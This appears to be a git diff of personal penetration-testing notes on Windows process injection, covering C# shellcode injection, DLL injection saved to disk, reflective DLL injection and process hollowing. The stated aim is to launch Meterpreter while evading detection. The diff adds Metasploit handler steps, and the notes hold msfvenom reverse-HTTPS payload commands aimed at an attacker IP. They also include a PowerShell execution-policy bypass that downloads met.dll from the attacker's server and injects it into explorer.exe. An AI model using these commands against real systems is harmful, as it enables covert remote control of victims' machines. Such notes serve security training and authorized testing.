@@ -1,8 +1,11 @@
+.exe that starts the meterpreter as another process (to evade detection)
+
 ## C# (Visual Studio)
 
 1. Open Process Explorer and find the process ID of explorer.exe (or other target process that you have sufficient integrity to open or idk about the permissions part)
 2. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f csharp`
-3. Open Visual Studio, paste this, and 
+3. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
+4. Open Visual Studio, paste this, and 
 ```
 using System;
 using System.Runtime.InteropServices;
@@ -37,14 +40,15 @@ namespace Inject
     }
 }
 ```
-4. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
-5. Click Build -> Build Solution
-6. Find the .exe in <project folder>/bin/x64/Release and run it
+5. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
+6. Click Build -> Build Solution
+7. Find the .exe in <project folder>/bin/x64/Release and run it
 
 ## DLL (saved to disk)
 1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<lport> -f dll -o met.dll`
 2. Make sure you `python3 -m http.server <http port>` in the same directory where met.dll resides
-3. Paste this in Visual Studio
+3. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
+4. Paste this in Visual Studio
 ```
 using System;
 using System.Diagnostics;
@@ -96,20 +100,22 @@ namespace Inject
     }
 }
 ```
-4. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
-5. Click Build -> Build Solution
-6. Find the .exe in <project folder>/bin/x64/Release and run it
+5. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
+6. Click Build -> Build Solution
+7. Find the .exe in <project folder>/bin/x64/Release and run it
 
 ## DLL (reflective)
 1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<lport> -f dll -o met.dll`
 2. Make sure you `python3 -m http.server <http port>` in the same directory where met.dll resides
-3. Paste `Invoke-ReflectivePEInjection.ps1` (in usbtools) into the victim system
-3. In Powershell, `PowerShell -Exec Bypass`, `$bytes = (New-Object System.Net.WebClient).DownloadData('http://<kali ip>:<http port>/met.dll')`, `$procid = (Get-Process -Name explorer).Id`, `Import-Module <.ps1 path>`, `Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid`
+3. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
+4. Paste `Invoke-ReflectivePEInjection.ps1` (in usbtools) into the victim system
+5. In Powershell, `PowerShell -Exec Bypass`, `$bytes = (New-Object System.Net.WebClient).DownloadData('http://<kali ip>:<http port>/met.dll')`, `$procid = (Get-Process -Name explorer).Id`, `Import-Module <.ps1 path>`, `Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid`
 
 ## Process Hollowing
 Start a process in suspended state, change its machine code before resuming execution
 1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<lport> -f csharp`
-2. Put this in Visual Studio
+2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
+3. Put this in Visual Studio
 ```
 using System;
 using System.Diagnostics;
